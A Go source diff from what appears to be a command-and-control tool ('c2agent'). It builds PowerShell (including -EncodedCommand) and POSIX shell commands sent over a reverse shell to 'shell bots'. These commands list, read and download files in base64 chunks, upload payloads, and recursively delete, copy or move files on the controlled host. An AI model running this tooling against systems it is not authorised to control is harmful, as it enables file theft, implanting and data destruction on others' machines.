@@ -8,93 +8,302 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"unicode/utf16"
 	"unicode/utf8"
 
 	"c2agent/internal/command"
 )
 
-func isWindows(osName string) bool { return osName == "Windows" }
+// Execution-environment identifiers for shell bots. The environment is the
+// command interpreter actually attached to the reverse shell; it decides how a
+// high-level action is turned into a command. Native agents do not use it.
+const (
+	EnvPowerShell = "PowerShell"
+	EnvCmd        = "cmd"
+	EnvBash       = "bash"
+	EnvSh         = "sh"
+	EnvUnknown    = "Unknown"
+)
 
-func isMac(osName string) bool { return osName == "macOS" }
+// target is a shell bot's OS plus command interpreter.
+type target struct {
+	os  string
+	env string
+}
+
+func (t target) isWindows() bool { return t.os == "Windows" }
+
+// psHost reports whether commands run directly in a PowerShell interpreter
+// (vs. being piped through `powershell -EncodedCommand` from a cmd.exe host).
+func (t target) psHost() bool { return t.isWindows() && t.env == EnvPowerShell }
 
 // posixQuote single-quotes a string for POSIX shells.
 func posixQuote(s string) string {
 	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
 }
 
-var cmdVarRe = regexp.MustCompile(`%[A-Za-z_][A-Za-z0-9_]*%`)
-
-// winQuote double-quotes a path for cmd, rejecting %VAR% patterns.
-func winQuote(s string) (string, error) {
-	if cmdVarRe.MatchString(s) {
-		return "", fmt.Errorf("cmd cannot safely handle '%%' variable patterns in path: %q", s)
-	}
-	return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`, nil
+// psLiteral single-quotes a string for a PowerShell script. Windows commands
+// are either executed directly by a PowerShell host or passed via
+// -EncodedCommand (cmd.exe host), so the value is evaluated exactly once:
+// '$', '%' and '`' are literal and need no special handling.
+func psLiteral(s string) string {
+	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
 }
 
-// psQuote quotes a path for a single-quoted PowerShell string (still parsed by
-// cmd first when the host shell is cmd). Windows filenames may not contain
-// '"' or '%', so reject them rather than risk breaking the outer quoting.
-func psQuote(s string) (string, error) {
-	if cmdVarRe.MatchString(s) {
-		return "", fmt.Errorf("cmd cannot safely handle '%%' variable patterns in path: %q", s)
+const (
+	posixChunk = 100000
+	// Guards against emitting a single shell command that exceeds the host
+	// shell's command-line / input length limits (base64 payload bytes).
+	posixCmdLimit = 900000
+	// winCmdLimit is cmd.exe's command-line budget (~8 KB) for the
+	// "powershell -NoProfile -EncodedCommand <b64>" launcher used on cmd.exe hosts.
+	winCmdLimit = 7000
+	// winPSCmdLimit bounds a command executed directly by a PowerShell host: it
+	// travels as one line into the reverse shell, whose read buffer is 64 KB.
+	winPSCmdLimit = 32000
+	// readFileByteCap bounds how many bytes a whole-file read pulls from the
+	// head of a file (enough for 51200 UTF-8 characters), so an enormous file
+	// cannot exhaust the controlled end's memory.
+	readFileByteCap = 51200 * 4
+
+	// Segmented transfer chunk sizes: each chunk is moved by ONE shell command,
+	// so it must fit the host shell's command-line limit once base64-encoded.
+	// The control end drives the offset loop; the shell bot only reads/appends.
+	posixTransferChunk = 32768
+	// cmd host: the base64 chunk must survive -EncodedCommand inflation (~8/3x).
+	winCmdTransferChunk = 1500
+	// PowerShell host: the chunk travels directly (no base64 command inflation).
+	winPSTransferChunk = 8192
+	// Read chunks are not embedded in the command (only the response carries
+	// data), so downloads can use a large chunk regardless of the host shell.
+	winReadChunk = 32768
+)
+
+// transferChunkSize is the plain-byte chunk size used for segmented upload
+// (the base64 payload is embedded in one command, so it is shell-limited).
+func (t target) transferChunkSize() int {
+	switch {
+	case t.psHost():
+		return winPSTransferChunk
+	case t.isWindows():
+		return winCmdTransferChunk
+	default:
+		return posixTransferChunk
 	}
-	if strings.ContainsRune(s, '"') {
-		return "", fmt.Errorf("invalid character in Windows path: %q", s)
-	}
-	return strings.ReplaceAll(s, "'", "''"), nil
 }
 
-func getCwdCmd(osName string) string {
-	if isWindows(osName) {
-		return `powershell -NoProfile -Command "(Get-Location).Path"`
+// readChunkSize is the plain-byte chunk size used for segmented download (the
+// payload is only in the reply, so it is not bounded by the command line).
+func (t target) readChunkSize() int {
+	if t.isWindows() {
+		return winReadChunk
 	}
-	return "pwd"
+	return posixTransferChunk
 }
 
-func listDirCmd(osName, path string) (string, error) {
-	if isWindows(osName) {
-		p, err := psQuote(path)
-		if err != nil {
-			return "", err
+// encodePS encodes a PowerShell script as UTF-16LE base64 for -EncodedCommand.
+func encodePS(script string) string {
+	u := utf16.Encode([]rune(script))
+	b := make([]byte, len(u)*2)
+	for i, r := range u {
+		b[2*i] = byte(r)
+		b[2*i+1] = byte(r >> 8)
+	}
+	return base64.StdEncoding.EncodeToString(b)
+}
+
+// finish turns a PowerShell script body into a command for the host: executed
+// directly on a PowerShell host, or via -EncodedCommand on a cmd.exe host (and
+// as the safe fallback when the interpreter is unknown). -EncodedCommand is
+// immune to cmd.exe quoting and to PowerShell variable expansion, which makes
+// it correct for BOTH host kinds.
+func (t target) finish(script string) (string, error) {
+	// A terminating error (e.g. a failed [IO.File] call) would otherwise
+	// propagate out of the reverse shell's `iex` and tear down the session.
+	// Wrapping turns such failures into ordinary output instead.
+	script = "try{" + script + "}catch{$_|Out-String}"
+	if t.psHost() {
+		if len(script) > winPSCmdLimit {
+			return "", fmt.Errorf("command too long for a PowerShell shell bot (%d > %d)", len(script), winPSCmdLimit)
 		}
-		return "powershell -NoProfile -Command \"Get-ChildItem -Force '" + p +
-			"' | Select-Object PSIsContainer,Length,Name | Format-Table -AutoSize\"", nil
+		return script, nil
+	}
+	cmd := "powershell -NoProfile -EncodedCommand " + encodePS(script)
+	if len(cmd) > winCmdLimit {
+		return "", fmt.Errorf("command too long for a cmd shell bot (%d > %d)", len(cmd), winCmdLimit)
+	}
+	return cmd, nil
+}
+
+// ---------------------------------------------------------------------------
+// PowerShell script bodies (shared by the PowerShell-host and cmd-host paths).
+// ---------------------------------------------------------------------------
+
+func psGetCwd() string { return "(Get-Location).Path" }
+
+func psListDir(path string) string {
+	p := psLiteral(path)
+	// Test-Path makes misses locale-independent; the explicit empty check makes
+	// an empty directory report "Empty directory" (Format-Table emits nothing
+	// for empty input), matching the native agents.
+	return "if(Test-Path -LiteralPath " + p + " -PathType Container){" +
+		"$c2i=@(Get-ChildItem -Force -LiteralPath " + p + ");" +
+		"if($c2i.Count -eq 0){'Empty directory'}" +
+		"else{$c2i | Select-Object PSIsContainer,Length,Name | Format-Table -AutoSize}" +
+		"}elseif(Test-Path -LiteralPath " + p + " -PathType Leaf){'Error: ' + " + p + " + ' is a file'}" +
+		"else{'Error: path not found: ' + " + p + "}"
+}
+
+// psReadHead base64-encodes at most maxBytes from the head of a file. OpenRead
+// (not ReadAllBytes) keeps memory bounded for huge files; errors are captured
+// as text so a missing/unreadable file never terminates the reverse shell.
+func psReadHead(path string, maxBytes int) string {
+	return "$c2fs=$null;try{$c2fs=[IO.File]::OpenRead(" + psLiteral(path) + ");" +
+		"$c2n=[int][Math]::Min(" + strconv.Itoa(maxBytes) + ",$c2fs.Length);" +
+		"$c2b=New-Object byte[] $c2n;$c2r=$c2fs.Read($c2b,0,$c2n);" +
+		"[Convert]::ToBase64String($c2b,0,$c2r)}catch{$_|Out-String}finally{if($c2fs){$c2fs.Close()}}"
+}
+
+func psReadChunk(path string, offset, length int64) string {
+	n := strconv.FormatInt(length, 10)
+	return "$c2fs=$null;try{$c2fs=[IO.File]::OpenRead(" + psLiteral(path) + ");" +
+		"$c2fs.Seek(" + strconv.FormatInt(offset, 10) + ",[IO.SeekOrigin]::Begin)|Out-Null;" +
+		"$c2b=New-Object byte[] " + n + ";$c2r=$c2fs.Read($c2b,0," + n + ");" +
+		"[Convert]::ToBase64String($c2b,0,$c2r)}catch{$_|Out-String}finally{if($c2fs){$c2fs.Close()}}"
+}
+
+func psFileSize(path string) string {
+	p := psLiteral(path)
+	// Guard with Test-Path: Get-Item on a missing path is a *non-terminating*
+	// error, and ($null).Length is 0, so an unguarded read reports size 0 and a
+	// download of a missing file would silently produce an empty local file.
+	return "if(Test-Path -LiteralPath " + p + " -PathType Leaf){" +
+		"try{(Get-Item -LiteralPath " + p + ").Length}catch{$_|Out-String}" +
+		"}else{'Error: not a file: ' + " + p + "}"
+}
+
+func psWriteBase64(path, b64 string) string {
+	return "$c2d=Split-Path -Parent " + psLiteral(path) + ";" +
+		"if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};" +
+		"[IO.File]::WriteAllBytes(" + psLiteral(path) + ",[Convert]::FromBase64String('" + b64 + "'))"
+}
+
+func psAppendBase64(path, b64 string) string {
+	return "$c2fs=$null;try{$c2fs=[IO.File]::Open(" + psLiteral(path) +
+		",[IO.FileMode]::Append,[IO.FileAccess]::Write,[IO.FileShare]::Read);" +
+		"$c2b=[Convert]::FromBase64String('" + b64 + "');$c2fs.Write($c2b,0,$c2b.Length)}finally{if($c2fs){$c2fs.Close()}}"
+}
+
+func psTruncateCreate(path string) string {
+	return "$c2d=Split-Path -Parent " + psLiteral(path) + ";" +
+		"if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};" +
+		"[IO.File]::WriteAllBytes(" + psLiteral(path) + ",(New-Object byte[] 0))"
+}
+
+func psCreateFile(path string) string {
+	p := psLiteral(path)
+	// Match the native agents: create the parent and a 0-byte file only if it
+	// does not already exist (New-Item -Force would truncate an existing file).
+	return "$c2d=Split-Path -Parent " + p + ";" +
+		"if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};" +
+		"if(-not (Test-Path -LiteralPath " + p + ")){[IO.File]::WriteAllBytes(" + p + ",(New-Object byte[] 0))}"
+}
+
+func psMakeDir(path string) string {
+	return "New-Item -ItemType Directory -Force -Path " + psLiteral(path) + "|Out-Null"
+}
+
+// psRemove is a best-effort recursive delete (used to clean up temp files).
+func psRemove(path string) string {
+	return "Remove-Item -Recurse -Force -LiteralPath " + psLiteral(path) + " -ErrorAction SilentlyContinue"
+}
+
+// psDelete removes path, enforcing the requested kind (file vs directory) like
+// the native agents: deleting a file as a directory (or vice versa) is refused
+// instead of silently wiping the wrong thing.
+func psDelete(path string, wantDir bool) string {
+	p := psLiteral(path)
+	if wantDir {
+		return "if(Test-Path -LiteralPath " + p + " -PathType Container){" +
+			"Remove-Item -Recurse -Force -LiteralPath " + p + " -ErrorAction SilentlyContinue" +
+			"}else{'Error: ' + " + p + " + ' is not a directory'}"
+	}
+	return "if(Test-Path -LiteralPath " + p + " -PathType Container){" +
+		"'Error: ' + " + p + " + ' is a directory'" +
+		"}else{Remove-Item -Force -LiteralPath " + p + " -ErrorAction SilentlyContinue}"
+}
+
+// psRename renames path to a bare newName in the same directory. It uses
+// Move-Item -Force (not Rename-Item) because Rename-Item refuses to overwrite
+// an existing destination, which would break the temp-file -> target rename
+// used by upload/edit_file (the original always exists).
+func psRename(path, newName string) (string, error) {
+	if newName == "" || strings.ContainsAny(newName, `/\`) {
+		return "", fmt.Errorf("new_name must be a bare name without path separators")
+	}
+	dest := remoteJoin(remoteParent(path), newName, target{os: "Windows"})
+	return "Move-Item -Force -LiteralPath " + psLiteral(path) + " -Destination " + psLiteral(dest), nil
+}
+
+// psEnsureParent prefaces a script with creation of its destination's parent
+// directory, matching the native agents (which MkdirAll the destination before
+// copy/move).
+func psEnsureParent(path string) string {
+	return "$c2d=Split-Path -Parent " + psLiteral(path) + ";if($c2d){[IO.Directory]::CreateDirectory($c2d)|Out-Null};"
+}
+
+func psCopy(src, dest string) string {
+	return psEnsureParent(dest) +
+		"Copy-Item -Recurse -Force -LiteralPath " + psLiteral(src) + " -Destination " + psLiteral(dest)
+}
+
+func psMove(src, dest string) string {
+	return psEnsureParent(dest) +
+		"Move-Item -Force -LiteralPath " + psLiteral(src) + " -Destination " + psLiteral(dest)
+}
+
+// psWrappedRead emits a sentinel-wrapped, size-bounded read of the whole file
+// for editing; missing is printed when the path is not a regular file.
+func psWrappedRead(path, begin, end, missing string, maxBytes int) string {
+	return "if(Test-Path -LiteralPath " + psLiteral(path) + " -PathType Leaf){" +
+		psLiteral(begin) + ";" + psReadHead(path, maxBytes) + ";" + psLiteral(end) +
+		"}else{" + psLiteral(missing) + "}"
+}
+
+// ---------------------------------------------------------------------------
+// Action builders.
+// ---------------------------------------------------------------------------
+
+func getCwdCmd(t target) (string, error) {
+	if t.isWindows() {
+		return t.finish(psGetCwd())
+	}
+	return "pwd", nil
+}
+
+func listDirCmd(t target, path string) (string, error) {
+	if t.isWindows() {
+		return t.finish(psListDir(path))
 	}
 	return "ls -la " + posixQuote(path), nil
 }
 
-// readFileCmd builds a read_file command. Whole-file reads (empty start_line)
-// read at most readFileByteCap bytes from the head on EVERY platform, so an
-// enormous file cannot exhaust the controlled end's memory; the control end
-// then truncates the result to 51200 characters. POSIX line ranges use `sed`
-// (bounded output); Windows ranges use the same bounded OpenRead as whole reads
-// and are sliced by the control end. Windows output is always base64.
-func readFileCmd(osName, path, startLine, endLine string) (string, error) {
-	if isWindows(osName) {
-		p, err := psQuote(path)
-		if err != nil {
-			return "", err
-		}
-		start := 0
+// readFileCmd builds a read_file command. Windows always performs a bounded
+// head read and returns base64; the control end decodes it and, when a line
+// range is requested, slices it (sliceLines) so the exact bytes are preserved
+// (Windows PowerShell's ReadLines/AppendLine would rewrite newlines). POSIX
+// line ranges use `sed` (bounded output); whole-file reads are capped by the
+// control end.
+func readFileCmd(t target, path, startLine, endLine string) (string, error) {
+	if t.isWindows() {
+		// Validate the start line as POSIX does; an invalid end_line falls back
+		// to end-of-file (mirroring the native agents).
 		if v := strings.TrimSpace(startLine); v != "" && v != "0" {
-			n, aerr := strconv.Atoi(v)
-			if aerr != nil {
+			if _, err := strconv.Atoi(v); err != nil {
 				return "", fmt.Errorf("invalid start_line: %s", v)
 			}
-			start = n
 		}
-		if start <= 0 {
-			// Whole-file read: bounded head read; the control end truncates.
-			return openReadBase64Cmd(p, readFileByteCap), nil
-		}
-		end := 0
-		if v := strings.TrimSpace(endLine); v != "" && v != "0" {
-			if n, aerr := strconv.Atoi(v); aerr == nil {
-				end = n
-			}
-		}
-		return windowsRangeBase64Cmd(p, start, end), nil
+		return t.finish(psReadHead(path, readFileByteCap))
 	}
 	start := strings.TrimSpace(startLine)
 	if start == "" || start == "0" {
@@ -117,108 +326,34 @@ func readFileCmd(osName, path, startLine, endLine string) (string, error) {
 	return "sed -n '" + strconv.Itoa(s) + ",$p' " + posixQuote(path), nil
 }
 
-// openReadBase64Cmd reads at most maxBytes from the head of a psQuoted path and
-// returns a PowerShell command that base64-encodes them. It uses OpenRead (not
-// ReadAllBytes) so a huge file cannot exhaust the agent's memory.
-func openReadBase64Cmd(p string, maxBytes int) string {
-	return "powershell -NoProfile -Command \"$fs=[IO.File]::OpenRead('" + p +
-		"');try{$n=[int][Math]::Min(" + strconv.Itoa(maxBytes) + ",$fs.Length);" +
-		"$b=New-Object byte[] $n;$r=$fs.Read($b,0,$n);" +
-		"[Convert]::ToBase64String($b,0,$r)}finally{$fs.Close()}\""
-}
-
-// windowsRangeBase64Cmd base64-encodes lines [start, end] (end<=0 = to EOF). It
-// uses [IO.File]::ReadLines, which lazily enumerates lines, so memory stays
-// proportional to the requested range rather than the whole file — deep ranges
-// work without reading the entire file into memory.
-func windowsRangeBase64Cmd(p string, start, end int) string {
-	stop := ""
-	if end > 0 {
-		stop = "if($i -ge " + strconv.Itoa(end) + "){break};"
-	}
-	return "powershell -NoProfile -Command \"[Text.StringBuilder]$o=New-Object Text.StringBuilder;$i=0;" +
-		"foreach($l in [IO.File]::ReadLines('" + p + "')){$i++;" +
-		"if($i -ge " + strconv.Itoa(start) + "){[void]$o.AppendLine($l)};" + stop + "};" +
-		"[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($o.ToString()))\""
-}
-
-// maxEditBytes is the largest file a shell bot can rewrite in one command: the
-// base64 payload must fit the platform's command-line limit (plain bytes are
-// ~3/4 of the base64 length). Larger files must be edited through a native agent.
-func maxEditBytes(osName string) int {
-	if isWindows(osName) {
-		return winCmdLimit*3/4 - 8
-	}
-	return posixCmdLimit*3/4 - 8
-}
-
-// readFileWrappedCmd emits a sentinel-wrapped, size-bounded read of the whole
-// file for editing. The content is base64 on BOTH platforms (so the control end
-// can never mistake file content for an error message), `missing` is printed
-// when path is not a regular file, and `begin`/`end` frame the payload.
-func readFileWrappedCmd(osName, path, begin, end, missing string, maxBytes int) (string, error) {
-	if isWindows(osName) {
-		p, err := psQuote(path)
-		if err != nil {
-			return "", err
-		}
-		return "powershell -NoProfile -Command \"if(Test-Path -LiteralPath '" + p +
-			"' -PathType Leaf){'" + begin + "';$fs=[IO.File]::OpenRead('" + p +
-			"');try{$n=[int][Math]::Min(" + strconv.Itoa(maxBytes) + ",$fs.Length);" +
-			"$b=New-Object byte[] $n;$r=$fs.Read($b,0,$n);[Convert]::ToBase64String($b,0,$r)}finally{$fs.Close()};'" + end +
-			"'}else{'" + missing + "'}\"", nil
-	}
-	return "if [ -f " + posixQuote(path) + " ] && [ -r " + posixQuote(path) + " ]; then printf '%s\\n' '" + begin +
-		"'; head -c " + strconv.Itoa(maxBytes) + " " + posixQuote(path) +
-		" | base64; printf '%s\\n' '" + end + "'; else printf '%s\\n' '" + missing + "'; fi", nil
-}
-
-// randSentinel returns a random per-call token used to frame a file read so
-// payload content can never be confused with a framing marker or error message.
-func randSentinel(prefix string) string {
-	buf := make([]byte, 8)
-	if _, err := rand.Read(buf); err != nil {
-		return "__C2EDIT_" + prefix + "_fallback__"
-	}
-	return "__C2EDIT_" + prefix + "_" + hex.EncodeToString(buf) + "__"
-}
-
-func makeDirCmd(osName, path string) (string, error) {
-	if isWindows(osName) {
-		q, err := winQuote(path)
-		if err != nil {
-			return "", err
-		}
-		return "mkdir " + q, nil
+func makeDirCmd(t target, path string) (string, error) {
+	if t.isWindows() {
+		return t.finish(psMakeDir(path))
 	}
 	return "mkdir -p " + posixQuote(path), nil
 }
 
-func deleteCmd(osName, path string) (string, error) {
-	if isWindows(osName) {
-		p, err := psQuote(path)
-		if err != nil {
-			return "", err
-		}
-		return "powershell -NoProfile -Command \"Remove-Item -Recurse -Force -LiteralPath '" + p + "'\"", nil
+func deleteCmd(t target, path string, wantDir bool) (string, error) {
+	if t.isWindows() {
+		return t.finish(psDelete(path, wantDir))
 	}
-	return "rm -rf " + posixQuote(path), nil
+	q := posixQuote(path)
+	if wantDir {
+		return "if [ -f " + q + " ]; then echo " + posixQuote("Error: "+path+" is a file") + "; else rm -rf " + q + "; fi", nil
+	}
+	return "if [ -d " + q + " ]; then echo " + posixQuote("Error: "+path+" is a directory") + "; else rm -f " + q + "; fi", nil
 }
 
-func renameCmd(osName, path, newName string) (string, error) {
+func renameCmd(t target, path, newName string) (string, error) {
+	if t.isWindows() {
+		body, err := psRename(path, newName)
+		if err != nil {
+			return "", err
+		}
+		return t.finish(body)
+	}
 	if newName == "" || strings.ContainsAny(newName, `/\`) {
 		return "", fmt.Errorf("new_name must be a bare name without path separators")
-	}
-	if isWindows(osName) {
-		p, err := psQuote(path)
-		if err != nil {
-			return "", err
-		}
-		n, err := psQuote(newName)
-		if err != nil {
-			return "", err
-		}
-		return "powershell -NoProfile -Command \"Rename-Item -LiteralPath '" + p + "' -NewName '" + n + "'\"", nil
 	}
 	return "mv " + posixQuote(path) + " " + posixQuote(posixSibling(path, newName)), nil
 }
@@ -243,12 +378,12 @@ func remoteParent(path string) string {
 	return ""
 }
 
-func remoteJoin(dir, name, osName string) string {
+func remoteJoin(dir, name string, t target) string {
 	if dir == "" {
 		return name
 	}
 	sep := "/"
-	if isWindows(osName) {
+	if t.isWindows() {
 		sep = `\`
 	}
 	if strings.HasSuffix(dir, "/") || strings.HasSuffix(dir, `\`) {
@@ -257,88 +392,32 @@ func remoteJoin(dir, name, osName string) string {
 	return dir + sep + name
 }
 
-func copyCmd(osName, src, dest string) (string, error) {
-	if isWindows(osName) {
-		s, err := psQuote(src)
-		if err != nil {
-			return "", err
-		}
-		d, err := psQuote(dest)
-		if err != nil {
-			return "", err
-		}
-		return "powershell -NoProfile -Command \"Copy-Item -Recurse -Force -LiteralPath '" + s + "' -Destination '" + d + "'\"", nil
+func copyCmd(t target, src, dest string) (string, error) {
+	if t.isWindows() {
+		return t.finish(psCopy(src, dest))
 	}
-	return "cp -r " + posixQuote(src) + " " + posixQuote(dest), nil
+	// Create the destination's parent first, like the native agents (MkdirAll).
+	return "mkdir -p \"$(dirname " + posixQuote(dest) + ")\"; cp -r " + posixQuote(src) + " " + posixQuote(dest), nil
 }
 
-func moveCmd(osName, src, dest string) (string, error) {
-	if isWindows(osName) {
-		s, err := psQuote(src)
-		if err != nil {
-			return "", err
-		}
-		d, err := psQuote(dest)
-		if err != nil {
-			return "", err
-		}
-		return "powershell -NoProfile -Command \"Move-Item -Force -LiteralPath '" + s + "' -Destination '" + d + "'\"", nil
+func moveCmd(t target, src, dest string) (string, error) {
+	if t.isWindows() {
+		return t.finish(psMove(src, dest))
 	}
-	return "mv " + posixQuote(src) + " " + posixQuote(dest), nil
+	return "mkdir -p \"$(dirname " + posixQuote(dest) + ")\"; mv " + posixQuote(src) + " " + posixQuote(dest), nil
 }
 
-func createFileCmd(osName, path string) (string, error) {
-	if isWindows(osName) {
-		p, err := psQuote(path)
-		if err != nil {
-			return "", err
-		}
-		return "powershell -NoProfile -Command \"$d=Split-Path -Parent '" + p +
-			"'; if($d){[IO.Directory]::CreateDirectory($d)|Out-Null}; New-Item -ItemType File -Force -Path '" + p + "' | Out-Null\"", nil
+func createFileCmd(t target, path string) (string, error) {
+	if t.isWindows() {
+		return t.finish(psCreateFile(path))
 	}
 	q := posixQuote(path)
 	return "mkdir -p \"$(dirname " + q + ")\"; touch " + q, nil
 }
 
-const (
-	posixChunk = 100000
-	// Guards against emitting a single shell command that exceeds the host
-	// shell's command-line / input length limits (base64 payload bytes).
-	posixCmdLimit = 900000
-	winCmdLimit   = 7000 // cmd.exe's command line is ~8 KB
-	// readFileByteCap bounds how many bytes a whole-file read pulls from the
-	// head of a file (enough for 51200 UTF-8 characters), so an enormous file
-	// cannot exhaust the controlled end's memory.
-	readFileByteCap = 51200 * 4
-
-	// Segmented transfer chunk sizes: each chunk is moved by ONE shell command,
-	// so it must fit the host shell's command-line limit once base64-encoded.
-	// The control end drives the offset loop; the shell bot only reads/appends.
-	posixTransferChunk = 32768
-	winTransferChunk   = 4096
-)
-
-// transferChunkSize is the plain-byte chunk size used for segmented upload and
-// download on this platform.
-func transferChunkSize(osName string) int {
-	if isWindows(osName) {
-		return winTransferChunk
-	}
-	return posixTransferChunk
-}
-
-// randToken returns a short random hex token for temporary file names.
-func randToken() string {
-	buf := make([]byte, 8)
-	if _, err := rand.Read(buf); err != nil {
-		return "fallback"
-	}
-	return hex.EncodeToString(buf)
-}
-
 // base64DecodeCmd is the platform's base64-decode invocation (BSD/macOS uses -D).
 func base64DecodeCmd(osName string) string {
-	if isMac(osName) {
+	if osName == "macOS" {
 		return "base64 -D"
 	}
 	return "base64 -d"
@@ -357,50 +436,32 @@ func chunks(s string, size int) []string {
 }
 
 // writeBase64Cmd builds a single command that base64-decodes b64 into destPath.
-func writeBase64Cmd(osName, destPath, b64 string) (string, error) {
-	if isWindows(osName) {
-		// A single well-formed command keeps the payload within cmd.exe's ~8 KB
-		// command-line limit; larger files are rejected (use a native agent).
-		// There is deliberately no multi-chunk path: it could never be reached
-		// within winCmdLimit and would also overflow the command line anyway.
-		if len(b64) > winCmdLimit {
-			return "", fmt.Errorf("file too large for a shell bot (%d base64 bytes > %d); use a native agent", len(b64), winCmdLimit)
-		}
-		dest, err := psQuote(destPath)
-		if err != nil {
-			return "", err
-		}
-		return "powershell -NoProfile -Command \"[IO.File]::WriteAllBytes('" + dest +
-			"',[Convert]::FromBase64String('" + b64 + "'))\"", nil
+func writeBase64Cmd(t target, destPath, b64 string) (string, error) {
+	if t.isWindows() {
+		return t.finish(psWriteBase64(destPath, b64))
 	}
 	if len(b64) > posixCmdLimit {
 		return "", fmt.Errorf("file too large for a shell bot (%d base64 bytes > %d); use a native agent", len(b64), posixCmdLimit)
 	}
 	dest := posixQuote(destPath)
-	// BSD (macOS) base64 decodes with -D, GNU with -d.
-	b64d := "base64 -d"
-	if isMac(osName) {
-		b64d = "base64 -D"
-	}
+	b64d := base64DecodeCmd(t.os)
+	// Create the destination's parent first, like the native agents (MkdirAll).
+	prefix := "mkdir -p \"$(dirname " + dest + ")\"; "
 	cs := chunks(b64, posixChunk)
 	if len(cs) == 0 {
-		return "printf '' > " + dest, nil
+		return prefix + "printf '' > " + dest, nil
 	}
 	parts := []string{"printf '%s' '" + cs[0] + "' | " + b64d + " > " + dest}
 	for _, c := range cs[1:] {
 		parts = append(parts, "printf '%s' '"+c+"' | "+b64d+" >> "+dest)
 	}
-	return strings.Join(parts, "; "), nil
+	return prefix + strings.Join(parts, "; "), nil
 }
 
 // fileSizeCmd returns a command that prints the size of path in bytes.
-func fileSizeCmd(osName, path string) (string, error) {
-	if isWindows(osName) {
-		p, err := psQuote(path)
-		if err != nil {
-			return "", err
-		}
-		return "powershell -NoProfile -Command \"(Get-Item -LiteralPath '" + p + "').Length\"", nil
+func fileSizeCmd(t target, path string) (string, error) {
+	if t.isWindows() {
+		return t.finish(psFileSize(path))
 	}
 	return "wc -c < " + posixQuote(path), nil
 }
@@ -408,17 +469,9 @@ func fileSizeCmd(osName, path string) (string, error) {
 // readChunkCmd returns a command that prints the base64 of `length` bytes at
 // byte `offset` in path. The control end drives this with a fixed chunk-size
 // loop, so memory on the shell bot is bounded regardless of file size.
-func readChunkCmd(osName, path string, offset, length int64) (string, error) {
-	if isWindows(osName) {
-		p, err := psQuote(path)
-		if err != nil {
-			return "", err
-		}
-		n := strconv.FormatInt(length, 10)
-		return "powershell -NoProfile -Command \"$fs=[IO.File]::OpenRead('" + p +
-			"');try{$fs.Seek(" + strconv.FormatInt(offset, 10) + ",[IO.SeekOrigin]::Begin)|Out-Null;" +
-			"$b=New-Object byte[] " + n + ";$r=$fs.Read($b,0," + n + ");" +
-			"[Convert]::ToBase64String($b,0,$r)}finally{$fs.Close()}\"", nil
+func readChunkCmd(t target, path string, offset, length int64) (string, error) {
+	if t.isWindows() {
+		return t.finish(psReadChunk(path, offset, length))
 	}
 	// tail -c +N starts at byte N (1-based); head -c L caps the chunk.
 	return "tail -c +" + strconv.FormatInt(offset+1, 10) + " " + posixQuote(path) +
@@ -427,15 +480,9 @@ func readChunkCmd(osName, path string, offset, length int64) (string, error) {
 
 // truncateCreateCmd returns a command that creates path's parent directory (if
 // needed) and truncates path to zero bytes, starting a fresh upload target.
-func truncateCreateCmd(osName, path string) (string, error) {
-	if isWindows(osName) {
-		p, err := psQuote(path)
-		if err != nil {
-			return "", err
-		}
-		return "powershell -NoProfile -Command \"$d=Split-Path -Parent '" + p +
-			"';if($d){[IO.Directory]::CreateDirectory($d)|Out-Null};" +
-			"[IO.File]::WriteAllBytes('" + p + "',(New-Object byte[] 0))\"", nil
+func truncateCreateCmd(t target, path string) (string, error) {
+	if t.isWindows() {
+		return t.finish(psTruncateCreate(path))
 	}
 	q := posixQuote(path)
 	return "mkdir -p \"$(dirname " + q + ")\"; : > " + q, nil
@@ -444,35 +491,74 @@ func truncateCreateCmd(osName, path string) (string, error) {
 // appendBase64Cmd returns a command that base64-decodes b64 and appends it to
 // path (creating the file if needed). The caller sizes chunks so b64 fits the
 // command line.
-func appendBase64Cmd(osName, path, b64 string) (string, error) {
-	if isWindows(osName) {
-		if len(b64) > winCmdLimit {
-			return "", fmt.Errorf("chunk too large (%d base64 bytes > %d)", len(b64), winCmdLimit)
-		}
-		p, err := psQuote(path)
-		if err != nil {
-			return "", err
-		}
-		return "powershell -NoProfile -Command \"$fs=[IO.File]::Open('" + p +
-			"',[IO.FileMode]::Append,[IO.FileAccess]::Write,[IO.FileShare]::Read);" +
-			"try{$b=[Convert]::FromBase64String('" + b64 + "');$fs.Write($b,0,$b.Length)}finally{$fs.Close()}\"", nil
+func appendBase64Cmd(t target, path, b64 string) (string, error) {
+	if t.isWindows() {
+		return t.finish(psAppendBase64(path, b64))
 	}
 	if len(b64) > posixCmdLimit {
 		return "", fmt.Errorf("chunk too large (%d base64 bytes > %d)", len(b64), posixCmdLimit)
 	}
-	return "printf '%s' '" + b64 + "' | " + base64DecodeCmd(osName) + " >> " + posixQuote(path), nil
+	return "printf '%s' '" + b64 + "' | " + base64DecodeCmd(t.os) + " >> " + posixQuote(path), nil
 }
 
-// removeCmd returns a best-effort command that deletes path.
-func removeCmd(osName, path string) (string, error) {
-	if isWindows(osName) {
-		p, err := psQuote(path)
-		if err != nil {
-			return "", err
-		}
-		return "powershell -NoProfile -Command \"Remove-Item -Force -LiteralPath '" + p + "' -ErrorAction SilentlyContinue\"", nil
+// removeCmd returns a best-effort command that deletes path (used for temp
+// files); unlike deleteCmd it enforces no file/directory kind.
+func removeCmd(t target, path string) (string, error) {
+	if t.isWindows() {
+		return t.finish(psRemove(path))
 	}
 	return "rm -f " + posixQuote(path), nil
+}
+
+// maxEditBytes is the largest file a shell bot can rewrite in one command: the
+// base64 payload must fit the host's command-line budget (plain bytes are ~1/4
+// less than base64, and cmd hosts inflate that ~2x more under -EncodedCommand).
+// Larger files must be edited through a native agent.
+func maxEditBytes(t target) int {
+	if t.isWindows() {
+		if t.psHost() {
+			// Direct script: plain bytes ~3/4 of the embedded base64, with room
+			// for the script wrapper under winPSCmdLimit.
+			return winPSCmdLimit*3/4 - 1500
+		}
+		// cmd host: the write goes through -EncodedCommand, which inflates the
+		// script ~8/3x (UTF-16LE word * base64). Keep well inside winCmdLimit
+		// including a generous path/wrapper margin.
+		return 1500
+	}
+	return posixCmdLimit*3/4 - 8
+}
+
